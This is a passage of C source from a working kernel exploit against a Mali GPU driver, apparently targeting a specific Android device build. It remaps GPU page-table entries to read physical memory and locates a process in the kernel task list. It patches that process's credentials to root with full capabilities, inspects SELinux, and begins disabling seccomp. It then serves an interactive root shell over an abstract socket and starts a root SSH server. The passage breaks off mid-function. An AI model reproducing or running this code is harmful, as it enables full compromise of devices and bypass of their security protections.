static bool run_physical_scan(struct mali_context *primary,
                              struct mali_context *secondary,
                              const struct mali_region *primary_job,
                              const struct mali_region *secondary_control,
                              const struct mali_region *secondary_output,
                              const struct page_table_candidate *candidates,
                              size_t candidate_count,
                              const struct reserved_region *reserved) {
  struct mapped_page_table mapped[RECLAIM_SPRAY_PAGES] = {0};
  size_t mapped_count = map_page_table_candidates(
      primary, secondary, primary_job, secondary_control, secondary_output,
      candidates, candidate_count, reserved, mapped, RECLAIM_SPRAY_PAGES);
  volatile unsigned char *output = secondary_output->cpu;
  size_t scanned_pages = 0;
  unsigned int operation = 0;
  int output_fd;
  size_t table_index;

  if (!mapped_count) {
    fprintf(stderr, "[-] no page-table candidates could be mapped\n");
    return false;
  }
  printf("[+] mapped %zu page-table pages for unique-VA reads\n", mapped_count);

  output_fd =
      open(PHYS_SCAN_PATH, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
  if (output_fd < 0) {
    fprintf(stderr, "[-] open %s: %s\n", PHYS_SCAN_PATH, strerror(errno));
    return false;
  }

  for (table_index = 0;
       table_index < mapped_count && scanned_pages < PHYS_SCAN_PAGES;
       table_index++) {
    const struct mapped_page_table *table = &mapped[table_index];
    size_t entry;

    for (entry = PTE_SCAN_ENTRY_START;
         entry < GINZA_MALI_PAGE_SIZE / sizeof(uint64_t) &&
         scanned_pages < PHYS_SCAN_PAGES;
         entry++) {
      uint64_t source_gpu_va;
      volatile uint64_t *source_cpu;
      uint64_t original_ate;
      uint64_t target_pa =
          PHYS_SCAN_START + scanned_pages * GINZA_MALI_PAGE_SIZE;
      uint64_t target_ate;
      uint64_t ate_gpu_va;
      uint8_t edit_atom = (uint8_t)(64U + ((operation * 3U) % 120U));
      uint8_t copy_atom = (uint8_t)(64U + ((operation * 3U + 1U) % 120U));
      uint8_t restore_atom = (uint8_t)(64U + ((operation * 3U + 2U) % 120U));
      uint32_t edit_event;
      uint32_t copy_event;
      uint32_t restore_event;

      if (!find_reserved_page(reserved, table->table_key, entry, &source_gpu_va,
                              &source_cpu))
        continue;
      if (table->excluded_entries[entry])
        continue;
      (void)source_cpu;
      original_ate = table->candidate->entries[entry];
      if ((original_ate & GPU_L3_ENTRY_TYPE_MASK) != GPU_L3_ENTRY_VALID)
        continue;
      target_ate = (original_ate & ~GPU_L3_ATE_PHYSICAL_MASK) | target_pa;
      ate_gpu_va = table->candidate->alias_gpu_va + entry * sizeof(uint64_t);

      edit_event =
          gpu_write64(primary, primary_job, ate_gpu_va, target_ate, edit_atom);
      usleep(1000);
      copy_event = gpu_copy_page(secondary, secondary_control, source_gpu_va,
                                 secondary_output->gpu_va, copy_atom);
      restore_event = gpu_write64(primary, primary_job, ate_gpu_va,
                                  original_ate, restore_atom);
      usleep(1000);
      __sync_synchronize();
      operation++;

      if (restore_event != BASE_JD_EVENT_DONE) {
        fprintf(stderr,
                "[-] physical scan could not restore PA 0x%016" PRIx64
                ": event=0x%08" PRIx32 "\n",
                target_pa, restore_event);
        close(output_fd);
        return false;
      }
      if (edit_event != BASE_JD_EVENT_DONE ||
          copy_event != BASE_JD_EVENT_DONE) {
        fprintf(stderr,
                "[-] physical scan stopped at PA 0x%016" PRIx64
                ": edit=0x%08" PRIx32 " copy=0x%08" PRIx32 "\n",
                target_pa, edit_event, copy_event);
        close(output_fd);
        return false;
      }
      if (write_full(output_fd, (const void *)output, GINZA_MALI_PAGE_SIZE) <
          0) {
        fprintf(stderr, "[-] write %s: %s\n", PHYS_SCAN_PATH, strerror(errno));
        close(output_fd);
        return false;
      }
      scanned_pages++;
      if (scanned_pages % 1024U == 0) {
        printf("[*] read %zu MiB through PA 0x%016" PRIx64 "\n",
               scanned_pages / 256U,
               PHYS_SCAN_START + scanned_pages * GINZA_MALI_PAGE_SIZE);
      }
    }
  }

  if (fsync(output_fd) < 0) {
    fprintf(stderr, "[-] fsync %s: %s\n", PHYS_SCAN_PATH, strerror(errno));
    close(output_fd);
    return false;
  }
  if (close(output_fd) < 0) {
    fprintf(stderr, "[-] close %s: %s\n", PHYS_SCAN_PATH, strerror(errno));
    return false;
  }
  if (scanned_pages != PHYS_SCAN_PAGES) {
    fprintf(stderr, "[-] scan capacity ended after %zu of %u pages\n",
            scanned_pages, PHYS_SCAN_PAGES);
    return false;
  }
  printf("[+] saved %zu MiB of read-only physical memory from 0x%016" PRIx64
         " to %s\n",
         scanned_pages / 256U, PHYS_SCAN_START, PHYS_SCAN_PATH);
  printf("[+] every temporary GPU ATE was restored; target RAM was not"
         " written\n");
  return true;
}

static bool validate_init_credential(struct physical_accessor *accessor) {
  unsigned char credential[GINZA_CRED_SIZE];
  static const size_t identity_offsets[] = {
      4U, 8U, 12U, 16U, 20U, 24U, 28U, 32U,
  };
  uint32_t usage;
  uint32_t security;
  uint64_t security_pa;
  size_t index;

  if (!read_kernel_virtual(accessor, GINZA_INIT_CRED, credential,
                           sizeof(credential)))
    return false;
  usage = load_u32(credential);
  if (usage == 0 || usage > 0x100000U) {
    fprintf(stderr, "[-] init_cred usage is implausible: %" PRIu32 "\n", usage);
    return false;
  }
  for (index = 0;
       index < sizeof(identity_offsets) / sizeof(identity_offsets[0]);
       index++) {
    if (load_u32(credential + identity_offsets[index]) != 0) {
      fprintf(stderr, "[-] init_cred identity field %zu is not zero\n", index);
      return false;
    }
  }
  if (load_u64(credential + GINZA_CRED_CAP_PERMITTED_OFFSET) !=
          GINZA_CAP_FULL ||
      load_u64(credential + GINZA_CRED_CAP_EFFECTIVE_OFFSET) !=
          GINZA_CAP_FULL ||
      load_u64(credential + GINZA_CRED_CAP_BSET_OFFSET) != GINZA_CAP_FULL) {
    fprintf(stderr, "[-] init_cred capability masks do not match this build\n");
    return false;
  }
  security = load_u32(credential + GINZA_CRED_SECURITY_OFFSET);
  if (!kernel_virtual_to_physical(security, &security_pa)) {
    fprintf(stderr,
            "[-] init_cred SELinux pointer is invalid: 0x%08" PRIx32 "\n",
            security);
    return false;
  }
  printf("[+] exact init_cred validated: usage=%" PRIu32
         " security=0x%08" PRIx32 "\n",
         usage, security);
  return true;
}

static bool
validate_current_credential(struct physical_accessor *accessor,
                            uint32_t credential_address,
                            unsigned char credential[GINZA_CRED_SIZE]) {
  uint32_t usage;
  uint32_t security;
  uint64_t security_pa;

  if (!read_kernel_virtual(accessor, credential_address, credential,
                           GINZA_CRED_SIZE))
    return false;
  usage = load_u32(credential);
  if (usage != 2U) {
    fprintf(stderr,
            "[-] current credential has external references (usage=%" PRIu32
            "); expected the task's real/subjective pair only\n",
            usage);
    return false;
  }
  if (load_u32(credential + GINZA_CRED_UID_OFFSET) != (uint32_t)getuid() ||
      load_u32(credential + GINZA_CRED_EUID_OFFSET) != (uint32_t)geteuid() ||
      load_u32(credential + GINZA_CRED_FSUID_OFFSET) != (uint32_t)geteuid() ||
      load_u32(credential + GINZA_CRED_GID_OFFSET) != (uint32_t)getgid() ||
      load_u32(credential + GINZA_CRED_EGID_OFFSET) != (uint32_t)getegid() ||
      load_u32(credential + GINZA_CRED_FSGID_OFFSET) != (uint32_t)getegid()) {
    fprintf(stderr, "[-] current credential IDs do not match the process\n");
    return false;
  }
  security = load_u32(credential + GINZA_CRED_SECURITY_OFFSET);
  if (!kernel_virtual_to_physical(security, &security_pa)) {
    fprintf(stderr,
            "[-] current credential SELinux pointer is invalid: 0x%08" PRIx32
            "\n",
            security);
    return false;
  }
  printf("[+] process-private credential validated: usage=%" PRIu32
         " uid=%u gid=%u security=0x%08" PRIx32 "\n",
         usage, (unsigned int)getuid(), (unsigned int)getgid(), security);
  return true;
}

static bool validate_root_credential(struct physical_accessor *accessor,
                                     uint32_t credential_address) {
  unsigned char credential[GINZA_CRED_SIZE];
  static const size_t identity_offsets[] = {
      4U, 8U, 12U, 16U, 20U, 24U, 28U, 32U,
  };
  uint32_t usage;
  uint32_t security;
  uint64_t ignored_pa;
  size_t index;

  if (!read_kernel_virtual(accessor, credential_address, credential,
                           sizeof(credential)))
    return false;
  usage = load_u32(credential);
  if (usage != 2U) {
    fprintf(stderr,
            "[-] root service child credential has unexpected usage=%" PRIu32
            "\n",
            usage);
    return false;
  }
  for (index = 0;
       index < sizeof(identity_offsets) / sizeof(identity_offsets[0]);
       index++) {
    if (load_u32(credential + identity_offsets[index]) != 0) {
      fprintf(stderr, "[-] root service child identity field %zu is not zero\n",
              index);
      return false;
    }
  }
  if (load_u64(credential + GINZA_CRED_CAP_PERMITTED_OFFSET) !=
          GINZA_CAP_FULL ||
      load_u64(credential + GINZA_CRED_CAP_EFFECTIVE_OFFSET) !=
          GINZA_CAP_FULL ||
      load_u64(credential + GINZA_CRED_CAP_BSET_OFFSET) != GINZA_CAP_FULL) {
    fprintf(stderr, "[-] root service child capability masks are incomplete\n");
    return false;
  }
  security = load_u32(credential + GINZA_CRED_SECURITY_OFFSET);
  if (!kernel_virtual_to_physical(security, &ignored_pa)) {
    fprintf(stderr,
            "[-] root service child SELinux pointer is invalid: 0x%08" PRIx32
            "\n",
            security);
    return false;
  }
  printf("[+] root service child credential validated: usage=%" PRIu32
         " cred=0x%08" PRIx32 " security=0x%08" PRIx32 "\n",
         usage, credential_address, security);
  return true;
}

static bool find_task_by_pid(struct physical_accessor *accessor,
                             uint32_t wanted_pid, const char *wanted_name,
                             uint32_t *task_address, uint32_t *stack_address,
                             uint32_t *real_cred, uint32_t *cred) {
  enum { TASK_SNAPSHOT_SIZE = GINZA_TASK_COMM_OFFSET + 16U };
  unsigned char snapshot[TASK_SNAPSHOT_SIZE];
  unsigned int attempt;

  for (attempt = 0; attempt < ROOT_TASK_SEARCH_ATTEMPTS; attempt++) {
    uint32_t current = GINZA_INIT_TASK;
    unsigned int visited;
    bool retry = false;

    accessor->cache_count = 0;
    for (visited = 0; visited < ROOT_MAX_TASKS; visited++) {
      uint32_t previous_list;
      uint32_t pid;
      uint32_t tgid;
      uint32_t current_stack;
      uint32_t current_real_cred;
      uint32_t current_cred;
      const char *comm;
      uint64_t ignored_pa;

      if (!read_kernel_virtual(accessor, current, snapshot, sizeof(snapshot)))
        return false;
      previous_list = load_u32(snapshot + GINZA_TASK_TASKS_PREV_OFFSET);
      pid = load_u32(snapshot + GINZA_TASK_PID_OFFSET);
      tgid = load_u32(snapshot + GINZA_TASK_TGID_OFFSET);
      current_stack = load_u32(snapshot + GINZA_TASK_STACK_OFFSET);
      current_real_cred = load_u32(snapshot + GINZA_TASK_REAL_CRED_OFFSET);
      current_cred = load_u32(snapshot + GINZA_TASK_CRED_OFFSET);
      comm = (const char *)(snapshot + GINZA_TASK_COMM_OFFSET);

      if (visited == 0) {
        if (pid != 0 || memcmp(comm, "swapper/0", sizeof("swapper/0")) != 0 ||
            current_real_cred != GINZA_INIT_CRED ||
            current_cred != GINZA_INIT_CRED) {
          fprintf(stderr,
                  "[*] init_task read did not match on pass %u; retrying\n",
                  attempt + 1U);
          retry = true;
          break;
        }
        if (attempt == 0)
          printf("[+] init_task and task-list anchor validated\n");
      }

      if (pid == wanted_pid && tgid == wanted_pid &&
          strncmp(comm, wanted_name, 16U) == 0) {
        if (current_real_cred != current_cred ||
            current_cred == GINZA_INIT_CRED ||
            !kernel_virtual_to_physical(current_cred, &ignored_pa) ||
            (current_stack & (GINZA_THREAD_SIZE - 1U)) != 0 ||
            !kernel_virtual_to_physical(current_stack, &ignored_pa)) {
          fprintf(stderr,
                  "[-] selected task has unexpected credential pointers\n");
          return false;
        }
        *task_address = current;
        *stack_address = current_stack;
        *real_cred = current_real_cred;
        *cred = current_cred;
        printf("[+] located %s task after %u entries on pass %u:"
               " pid=%" PRIu32 " task=0x%08" PRIx32 " stack=0x%08" PRIx32
               " cred=0x%08" PRIx32 "\n",
               wanted_name, visited + 1U, attempt + 1U, pid, current,
               current_stack, current_cred);
        return true;
      }

      if (previous_list == GINZA_INIT_TASK + GINZA_TASK_TASKS_OFFSET)
        break;
      if (previous_list < GINZA_TASK_TASKS_OFFSET) {
        retry = true;
        break;
      }
      current = previous_list - GINZA_TASK_TASKS_OFFSET;
      if (!kernel_virtual_to_physical(current, &ignored_pa) ||
          (current & 3U) != 0) {
        retry = true;
        break;
      }
    }
    fprintf(stderr,
            "[*] task-list pass %u changed after %u entries; retrying\n",
            attempt + 1U, visited + (retry ? 1U : 0U));
    usleep(10000);
  }

  fprintf(stderr,
          "[-] could not find pid %" PRIu32
          " (%s) after %u fresh task-list passes\n",
          wanted_pid, wanted_name, ROOT_TASK_SEARCH_ATTEMPTS);
  return false;
}

static bool prepare_credential_field_patches(
    uint32_t credential_address,
    const unsigned char credential[GINZA_CRED_SIZE], uint64_t *physical_page,
    struct physical_patch32 patches[ROOT_CRED_PATCH_COUNT]) {
  static const uint16_t field_offsets[ROOT_CRED_PATCH_COUNT] = {
      4U, 8U, 12U, 16U, 20U, 24U, 28U, 32U, 48U, 52U, 56U, 60U, 64U, 68U,
  };
  static const uint32_t root_values[ROOT_CRED_PATCH_COUNT] = {
      0U,         0U,          0U,         0U,          0U,
      0U,         0U,          0U,         UINT32_MAX,  0x000001ffU,
      UINT32_MAX, 0x000001ffU, UINT32_MAX, 0x000001ffU,
  };
  uint64_t credential_pa;
  size_t index;

  if (!kernel_virtual_to_physical(credential_address, &credential_pa))
    return false;
  *physical_page = credential_pa & ~(uint64_t)(GINZA_MALI_PAGE_SIZE - 1U);
  for (index = 0; index < ROOT_CRED_PATCH_COUNT; index++) {
    uint64_t field_pa = credential_pa + field_offsets[index];

    if ((field_pa & ~(uint64_t)(GINZA_MALI_PAGE_SIZE - 1U)) != *physical_page) {
      fprintf(stderr, "[-] credential root fields cross a physical page\n");
      return false;
    }
    patches[index].offset = (uint16_t)(field_pa & (GINZA_MALI_PAGE_SIZE - 1U));
    patches[index].before = load_u32(credential + field_offsets[index]);
    patches[index].after = root_values[index];
  }
  return true;
}

static bool read_selinux_state_word(struct physical_accessor *accessor,
                                    uint32_t *word) {
  if (!read_kernel_virtual(accessor, GINZA_SELINUX_STATE, word, sizeof(*word)))
    return false;
  if (((*word >> 16) & 0xffU) == 0 || (*word & 0xffU) > 1U) {
    fprintf(stderr,
            "[-] selinux_state header is implausible: 0x%08" PRIx32 "\n",
            *word);
    return false;
  }
  printf("[+] selinux_state validated: enforcing=%u initialized=%u"
         " header=0x%08" PRIx32 "\n",
         *word & 0xffU, (*word >> 16) & 0xffU, *word);
  return true;
}

static int read_selinux_enforce_file(void) {
  char value = '?';
  int descriptor = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);

  if (descriptor < 0)
    return -1;
  if (read(descriptor, &value, 1) != 1)
    value = '?';
  close(descriptor);
  if (value == '0' || value == '1')
    return value - '0';
  return -1;
}

static bool join_root_path(char *destination, size_t capacity,
                           const char *directory, const char *name) {
  int length = snprintf(destination, capacity, "%s/%s", directory, name);

  return length > 0 && (size_t)length < capacity;
}

static bool initialize_root_paths(struct root_paths *paths) {
  const char *directory = getenv(ROOT_STATE_DIRECTORY_ENV);
  bool private_state = directory && directory[0];
  int length;

  if (!private_state)
    directory = ROOT_DEFAULT_SSH_DIRECTORY;
  if (directory[0] != '/') {
    fprintf(stderr, "[-] %s must name an absolute directory\n",
            ROOT_STATE_DIRECTORY_ENV);
    return false;
  }
  length =
      snprintf(paths->directory, sizeof(paths->directory), "%s", directory);
  if (length <= 0 || (size_t)length >= sizeof(paths->directory) ||
      !join_root_path(paths->authorized_keys, sizeof(paths->authorized_keys),
                      directory, "authorized_keys") ||
      !join_root_path(paths->host_key, sizeof(paths->host_key), directory,
                      "dropbear_ed25519_host_key") ||
      !join_root_path(paths->log, sizeof(paths->log), directory,
                      "dropbear.log") ||
      !join_root_path(paths->pid_file, sizeof(paths->pid_file), directory,
                      "dropbear.pid")) {
    fprintf(stderr, "[-] root state path is too long\n");
    return false;
  }
  if (private_state) {
    if (!join_root_path(paths->proof, sizeof(paths->proof), directory,
                        "root-proof.txt")) {
      fprintf(stderr, "[-] root proof path is too long\n");
      return false;
    }
  } else {
    length = snprintf(paths->proof, sizeof(paths->proof), "%s",
                      ROOT_DEFAULT_PROOF_PATH);
    if (length <= 0 || (size_t)length >= sizeof(paths->proof))
      return false;
  }
  return true;
}

static bool write_root_proof(uint32_t task_address, uint32_t old_cred,
                             uint32_t selinux_before, uint32_t selinux_after,
                             pid_t ssh_pid, const struct root_paths *paths) {
  int descriptor =
      open(paths->proof, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
  bool written;

  if (descriptor < 0) {
    fprintf(stderr, "[-] open %s: %s\n", paths->proof, strerror(errno));
    return false;
  }
  written =
      dprintf(descriptor,
              "uid=%u euid=%u gid=%u egid=%u\n"
              "pid=%u task=0x%08" PRIx32 "\n"
              "old_cred=0x%08" PRIx32 " init_cred=0x%08" PRIx32 "\n"
              "selinux_before=0x%08" PRIx32 " selinux_after=0x%08" PRIx32
              " enforce_file=%d\n"
              "seccomp=%d\n"
              "ssh_port=%u ssh_pid=%d authorized_keys=%s\n"
              "socket=@%s\n",
              (unsigned int)getuid(), (unsigned int)geteuid(),
              (unsigned int)getgid(), (unsigned int)getegid(),
              (unsigned int)getpid(), task_address, old_cred, GINZA_INIT_CRED,
              selinux_before, selinux_after, read_selinux_enforce_file(),
              prctl(PR_GET_SECCOMP, 0, 0, 0, 0), ROOT_SSH_PORT, (int)ssh_pid,
              paths->authorized_keys, ROOT_SOCKET_NAME) >= 0;
  if (written && fsync(descriptor) < 0)
    written = false;
  if (close(descriptor) < 0)
    written = false;
  if (!written) {
    fprintf(stderr, "[-] write %s: %s\n", paths->proof, strerror(errno));
    return false;
  }
  return true;
}

static int create_root_socket(void) {
  struct sockaddr_un address;
  size_t name_length = strlen(ROOT_SOCKET_NAME);
  socklen_t address_length;
  int descriptor;

  if (name_length + 1U > sizeof(address.sun_path)) {
    errno = ENAMETOOLONG;
    return -1;
  }
  descriptor = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (descriptor < 0)
    return -1;
  memset(&address, 0, sizeof(address));
  address.sun_family = AF_UNIX;
  memcpy(address.sun_path + 1, ROOT_SOCKET_NAME, name_length);
  address_length =
      (socklen_t)(offsetof(struct sockaddr_un, sun_path) + 1U + name_length);
  if (bind(descriptor, (const struct sockaddr *)&address, address_length) < 0 ||
      listen(descriptor, 4) < 0) {
    int saved_errno = errno;

    close(descriptor);
    errno = saved_errno;
    return -1;
  }
  return descriptor;
}

static bool protect_root_process(void) {
  static const char adjustment[] = "-1000\n";
  int descriptor;
  int saved_errno;
  ssize_t written;

  if (prctl(PR_SET_PDEATHSIG, 0) < 0) {
    fprintf(stderr, "[-] clear parent-death signal: %s\n", strerror(errno));
    return false;
  }
  if (setsid() < 0 && errno != EPERM) {
    fprintf(stderr, "[-] detach root session: %s\n", strerror(errno));
    return false;
  }
  descriptor = open("/proc/self/oom_score_adj", O_WRONLY | O_CLOEXEC);
  if (descriptor < 0) {
    fprintf(stderr,
            "[*] oom_score_adj protection is unavailable: %s; the foreground"
            " service remains active\n",
            strerror(errno));
    return true;
  }
  written = write(descriptor, adjustment, sizeof(adjustment) - 1U);
  saved_errno = written < 0 ? errno : EIO;
  if (close(descriptor) < 0 && written == (ssize_t)(sizeof(adjustment) - 1U)) {
    fprintf(stderr,
            "[*] oom_score_adj protection could not be finalized: %s; the"
            " foreground service remains active\n",
            strerror(errno));
    return true;
  }
  if (written != (ssize_t)(sizeof(adjustment) - 1U)) {
    fprintf(stderr,
            "[*] oom_score_adj protection is unavailable: %s; the foreground"
            " service remains active\n",
            strerror(saved_errno));
    return true;
  }
  printf("[+] root process detached with oom_score_adj=-1000\n");
  return true;
}

static bool evict_cpu_data_cache(void) {
  static volatile unsigned char *arena;
  static unsigned int generation;
  size_t offset;

  if (!arena) {
    void *mapping =
        mmap(NULL, ROOT_CACHE_EVICTION_BYTES, PROT_READ | PROT_WRITE,
             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (mapping == MAP_FAILED) {
      fprintf(stderr, "[-] allocate CPU cache eviction arena: %s\n",
              strerror(errno));
      return false;
    }
    arena = mapping;
    printf("[+] allocated %u MiB CPU cache eviction arena\n",
           ROOT_CACHE_EVICTION_BYTES / (1024U * 1024U));
  }

  generation++;
  for (offset = 0; offset < ROOT_CACHE_EVICTION_BYTES;
       offset += ROOT_CACHE_LINE_BYTES)
    arena[offset] = (unsigned char)(arena[offset] + generation);
  __sync_synchronize();
  return true;
}

static bool prepare_root_shell_capabilities(void) {
  struct __user_cap_header_struct header = {
      .version = _LINUX_CAPABILITY_VERSION_3,
      .pid = 0,
  };
  struct __user_cap_data_struct data[_LINUX_CAPABILITY_U32S_3];
  unsigned int capability;

  memset(data, 0, sizeof(data));
  data[0].inheritable = UINT32_MAX;
  data[0].permitted = UINT32_MAX;
  data[0].effective = UINT32_MAX;
  data[1].inheritable = (uint32_t)(GINZA_CAP_FULL >> 32);
  data[1].permitted = (uint32_t)(GINZA_CAP_FULL >> 32);
  data[1].effective = (uint32_t)(GINZA_CAP_FULL >> 32);
  if (syscall(SYS_capset, &header, data) < 0) {
    fprintf(stderr, "[-] root shell capset: %s\n", strerror(errno));
    return false;
  }
  for (capability = 0; capability <= GINZA_CAP_LAST; capability++) {
    if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, capability, 0, 0) < 0) {
      fprintf(stderr, "[-] raise ambient capability %u: %s\n", capability,
              strerror(errno));
      return false;
    }
  }
  return true;
}

static bool prepare_root_ssh_storage(const char *executable,
                                     const struct root_paths *paths) {
  struct stat status;
  pid_t child;
  int child_status;

  if (!executable || executable[0] != '/' || lstat(executable, &status) < 0 ||
      !S_ISREG(status.st_mode) || access(executable, X_OK) < 0) {
    fprintf(stderr, "[-] invalid Dropbear executable: %s\n",
            executable ? executable : "<unset>");
    return false;
  }

  if (lstat(paths->directory, &status) < 0) {
    if (errno != ENOENT || mkdir(paths->directory, 0700) < 0) {
      fprintf(stderr, "[-] create %s: %s\n", paths->directory, strerror(errno));
      return false;
    }
  } else if (!S_ISDIR(status.st_mode)) {
    fprintf(stderr, "[-] %s is not a directory\n", paths->directory);
    return false;
  }
  if (chown(paths->directory, 0, 0) < 0 || chmod(paths->directory, 0700) < 0) {
    fprintf(stderr, "[-] secure %s: %s\n", paths->directory, strerror(errno));
    return false;
  }

  if (lstat(paths->authorized_keys, &status) < 0 || !S_ISREG(status.st_mode) ||
      status.st_size <= 0 || status.st_size > 64 * 1024) {
    fprintf(stderr, "[-] missing or invalid %s\n", paths->authorized_keys);
    return false;
  }
  if (chown(paths->authorized_keys, 0, 0) < 0 ||
      chmod(paths->authorized_keys, 0600) < 0) {
    fprintf(stderr, "[-] secure %s: %s\n", paths->authorized_keys,
            strerror(errno));
    return false;
  }

  if (lstat(paths->host_key, &status) < 0) {
    if (errno != ENOENT) {
      fprintf(stderr, "[-] inspect %s: %s\n", paths->host_key, strerror(errno));
      return false;
    }
    child = fork();
    if (child < 0) {
      fprintf(stderr, "[-] fork Dropbear key generator: %s\n", strerror(errno));
      return false;
    }
    if (child == 0) {
      if (!prepare_root_shell_capabilities())
        _exit(126);
      execl(executable, executable, "dropbearkey", "-t", "ed25519", "-f",
            paths->host_key, (char *)NULL);
      dprintf(STDERR_FILENO, "exec Dropbear key generator: %s\n",
              strerror(errno));
      _exit(127);
    }
    while (waitpid(child, &child_status, 0) < 0) {
      if (errno != EINTR) {
        fprintf(stderr, "[-] wait for Dropbear key generator: %s\n",
                strerror(errno));
        return false;
      }
    }
    if (!WIFEXITED(child_status) || WEXITSTATUS(child_status) != 0) {
      fprintf(stderr, "[-] Dropbear key generator exited unsuccessfully\n");
      return false;
    }
    printf("[+] generated persistent Ed25519 SSH host key\n");
  }

  if (lstat(paths->host_key, &status) < 0 || !S_ISREG(status.st_mode) ||
      status.st_size <= 0 || chown(paths->host_key, 0, 0) < 0 ||
      chmod(paths->host_key, 0600) < 0) {
    fprintf(stderr, "[-] secure %s: %s\n", paths->host_key, strerror(errno));
    return false;
  }
  return true;
}

static bool tcp_table_has_root_ssh_listener(const char *path) {
  FILE *table = fopen(path, "re");
  char line[512];
  bool found = false;

  if (!table)
    return false;
  while (fgets(line, sizeof(line), table)) {
    char address[65];
    unsigned int port;
    unsigned int state;

    if (sscanf(line, " %*u: %64[0-9A-Fa-f]:%x %*64s %x", address, &port,
               &state) == 3 &&
        port == ROOT_SSH_PORT && state == 0x0aU) {
      found = true;
      break;
    }
  }
  fclose(table);
  return found;
}

static bool root_ssh_is_listening(void) {
  return tcp_table_has_root_ssh_listener("/proc/net/tcp") ||
         tcp_table_has_root_ssh_listener("/proc/net/tcp6");
}

static void stop_root_ssh(pid_t child) {
  unsigned int attempt;

  if (child <= 0)
    return;
  if (kill(child, SIGTERM) < 0 && errno != ESRCH)
    fprintf(stderr, "[-] stop Dropbear process %d: %s\n", (int)child,
            strerror(errno));
  for (attempt = 0; attempt < 50U; attempt++) {
    pid_t result = waitpid(child, NULL, WNOHANG);

    if (result == child || (result < 0 && errno == ECHILD))
      return;
    if (result < 0 && errno != EINTR)
      break;
    usleep(20000);
  }
  if (kill(child, SIGKILL) < 0 && errno != ESRCH)
    fprintf(stderr, "[-] kill Dropbear process %d: %s\n", (int)child,
            strerror(errno));
  while (waitpid(child, NULL, 0) < 0 && errno == EINTR)
    ;
}

static pid_t start_root_ssh(const struct root_paths *paths) {
  const char *executable = getenv(ROOT_SSH_EXECUTABLE_ENV);
  int log_descriptor;
  pid_t child;
  unsigned int attempt;

  if (!executable || !executable[0]) {
    printf("[*] %s is unset; SSH was not requested\n", ROOT_SSH_EXECUTABLE_ENV);
    return 0;
  }
  if (!prepare_root_ssh_storage(executable, paths))
    return -1;

  log_descriptor =
      open(paths->log, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
  if (log_descriptor < 0 || chown(paths->log, 0, 0) < 0 ||
      chmod(paths->log, 0600) < 0) {
    fprintf(stderr, "[-] open %s: %s\n", paths->log, strerror(errno));
    if (log_descriptor >= 0)
      close(log_descriptor);
    return -1;
  }

  child = fork();
  if (child < 0) {
    fprintf(stderr, "[-] fork Dropbear server: %s\n", strerror(errno));
    close(log_descriptor);
    return -1;
  }
  if (child == 0) {
    int null_descriptor;

    if (prctl(PR_SET_PDEATHSIG, 0) < 0)
      _exit(126);
    if (setsid() < 0 && errno != EPERM)
      _exit(126);
    if (!prepare_root_shell_capabilities())
      _exit(126);
    null_descriptor = open("/dev/null", O_RDONLY | O_CLOEXEC);
    if (null_descriptor < 0 || dup2(null_descriptor, STDIN_FILENO) < 0 ||
        dup2(log_descriptor, STDOUT_FILENO) < 0 ||
        dup2(log_descriptor, STDERR_FILENO) < 0)
      _exit(126);
    if (null_descriptor > STDERR_FILENO)
      close(null_descriptor);
    if (log_descriptor > STDERR_FILENO)
      close(log_descriptor);
    execl(executable, executable, "dropbear", "-F", "-p", ROOT_SSH_PORT_TEXT,
          "-r", paths->host_key, "-D", paths->directory, "-P", paths->pid_file,
          (char *)NULL);
    _exit(127);
  }
  close(log_descriptor);

  for (attempt = 0; attempt < 100U; attempt++) {
    int child_status;
    pid_t result = waitpid(child, &child_status, WNOHANG);

    if (result == child) {
      fprintf(stderr, "[-] Dropbear exited before listening (status=%d)\n",
              child_status);
      return -1;
    }
    if (result < 0 && errno != EINTR) {
      fprintf(stderr, "[-] inspect Dropbear process: %s\n", strerror(errno));
      stop_root_ssh(child);
      return -1;
    }
    if (root_ssh_is_listening()) {
      printf("[+] key-only root SSH ready on TCP port %u (pid=%d)\n",
             ROOT_SSH_PORT, (int)child);
      return child;
    }
    usleep(100000);
  }

  fprintf(stderr, "[-] Dropbear did not listen within 10 seconds\n");
  stop_root_ssh(child);
  return -1;
}

static _Noreturn void serve_root_shells(int listener) {
  if (signal(SIGCHLD, SIG_IGN) == SIG_ERR)
    fprintf(stderr, "[-] SIGCHLD setup: %s\n", strerror(errno));
  printf("[+] temporary root shell ready on abstract socket @%s\n",
         ROOT_SOCKET_NAME);
  printf("[+] host connection: adb forward tcp:4242 localabstract:%s\n",
         ROOT_SOCKET_NAME);
  printf("[+] keep this process alive; reboot releases the GPU state\n");

  for (;;) {
    int client = accept(listener, NULL, NULL);
    pid_t child;

    if (client < 0) {
      if (errno == EINTR)
        continue;
      fprintf(stderr, "[-] root socket accept: %s\n", strerror(errno));
      usleep(500000);
      continue;
    }
    child = fork();
    if (child < 0) {
      fprintf(stderr, "[-] root shell fork: %s\n", strerror(errno));
      close(client);
      continue;
    }
    if (child == 0) {
      close(listener);
      if (!prepare_root_shell_capabilities())
        _exit(126);
      if (dup2(client, STDIN_FILENO) < 0 || dup2(client, STDOUT_FILENO) < 0 ||
          dup2(client, STDERR_FILENO) < 0)
        _exit(126);
      if (client > STDERR_FILENO)
        close(client);
      execl("/system/bin/sh", "sh", "-i", (char *)NULL);
      dprintf(STDERR_FILENO, "exec /system/bin/sh: %s\n", strerror(errno));
      _exit(127);
    }
    close(client);
  }
}

static void reverse_physical_patches(struct physical_patch32 *destination,
                                     const struct physical_patch32 *source,
                                     size_t patch_count) {
  size_t index;

  for (index = 0; index < patch_count; index++) {
    destination[index] = source[index];
    destination[index].before = source[index].after;
    destination[index].after = source[index].before;
  }
}

static bool disable_process_seccomp(
    struct physical_accessor *accessor, uint32_t task_address,
    uint32_t stack_address, int expected_mode, bool verify_current,
    bool *changed, uint64_t *task_page,
    struct physical_patch32 task_patches[ROOT_SECCOMP_PATCH_COUNT],
    uint64_t *stack_page, struct physical_patch32 *stack_patch) {
  unsigned char seccomp[12];
  uint32_t thread_flags;
  uint32_t mode;
  uint32_t filter_count;
  uint32_t filter;
  uint64_t task_seccomp_pa;
  uint64_t stack_flags_pa;
  uint64_t ignored_pa;
